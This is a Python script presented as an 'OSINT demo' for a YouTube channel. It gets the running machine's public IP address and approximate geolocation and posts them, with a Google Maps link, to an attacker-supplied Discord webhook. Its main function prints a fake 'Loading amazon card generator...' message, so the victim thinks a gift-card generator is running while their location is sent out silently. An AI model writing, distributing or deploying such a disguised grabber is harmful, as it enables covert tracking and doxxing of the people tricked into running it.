import sys
import datetime
import json
import requests
from datetime import UTC

WEBHOOK_URL = "PUT_WEBHOOK_HERE"  # Your provided webhook
DEVICE_LABEL = "OSINT-Device"

def get_public_ip():
    """fetch public ip"""
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        response.raise_for_status()
        return response.json().get("ip")
    except Exception:
        return None

def get_geolocation(ip, retries=2):
    """tryna fetch the location"""
    # ipapi.co first
    for _ in range(retries):
        try:
            response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
            response.raise_for_status()
            data = response.json()
            if 'error' not in data and data.get('latitude') and data.get('longitude'):
                return data.get('latitude'), data.get('longitude'), data.get('city', 'Unknown'), data.get('country_name', 'Unknown')
        except Exception:
            pass
    
    # try another
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/geo", timeout=5)
        response.raise_for_status()
        data = response.json()
        if 'loc' in data:
            lat, lon = data['loc'].split(',')
            return float(lat), float(lon), data.get('city', 'Unknown'), data.get('country', 'Unknown')
    except Exception:
        pass
    
    return None, None, 'Unknown', 'Unknown'

def build_discord_embed(ip, lat, lon, city, country):
    """embed"""
    map_url = f"https://www.google.com/maps?q={lat},{lon}" if lat is not None and lon is not None else "https://www.google.com/maps"
    embed = {
        "title": "🌍 OSINT Demo: Public IP & Geolocation",
        "description": "Explore public network info with this sleek OSINT tool! Check out the approximate location and map link below. 🕵️‍♂️",
        "color": 0x1abc9c,
        "fields": [
            {"name": "Device Label", "value": DEVICE_LABEL, "inline": True},
            {"name": "Public IP", "value": ip or "Unavailable", "inline": True},
            {"name": "Location", "value": f"{city}, {country}" if city != 'Unknown' else "Unavailable", "inline": True},
            {"name": "Latitude", "value": f"{lat:.4f}" if lat is not None else "Unavailable", "inline": True},
            {"name": "Longitude", "value": f"{lon:.4f}" if lon is not None else "Unavailable", "inline": True},
            {"name": "Map Link", "value": f"[View on Google Maps]({map_url})", "inline": False},
            {"name": "Timestamp (UTC)", "value": datetime.datetime.now(UTC).isoformat() + "Z", "inline": False}
        ],
        "author": {
            "name": "CybrSec Academy",
            "url": "https://www.youtube.com/@cybrsecacademy" 
        },
        "footer": {
            "text": "CybrSec Academy - OSINT YouTube Demo | Use only for good!"
        }
    }
    return {"embeds": [embed]}

def send_to_webhook(webhook_url, payload):
    """send to webhook"""
    headers = {"Content-Type": "application/json"}
    try:
        response = requests.post(webhook_url, data=json.dumps(payload), headers=headers, timeout=10)
        response.raise_for_status()
        return True
    except Exception:
        return False

def main():
    print("Loading amazon card generator...") 

    webhook_url = sys.argv[1] if len(sys.argv) > 1 else WEBHOOK_URL
    if not webhook_url or webhook_url == "https://discord.com/api/webhooks/ID/TOKEN":
        return

    ip = get_public_ip()
    if not ip:
        return  

    lat, lon, city, country = get_geolocation(ip)

    payload = build_discord_embed(ip, lat, lon, city, country)

    send_to_webhook(webhook_url, payload) 

if __name__ == "__main__":
    main()
